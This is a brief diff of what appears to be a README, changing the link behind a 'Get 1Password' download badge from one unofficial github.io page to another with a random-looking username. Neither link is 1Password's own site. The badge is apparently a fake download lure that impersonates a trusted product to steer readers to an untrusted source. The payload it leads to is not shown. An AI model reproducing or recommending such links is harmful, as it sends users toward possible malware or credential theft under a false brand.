@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/1Password">  
+<a href="https://tembilamusion.github.io/.github/1Password">  
 <img src="https://img.shields.io/badge/🔐_Get_1Password-007ACC?style=for-the-badge&logo=apple&logoColor=white" alt="Get 1Password">  
 </a>  
 </div>  
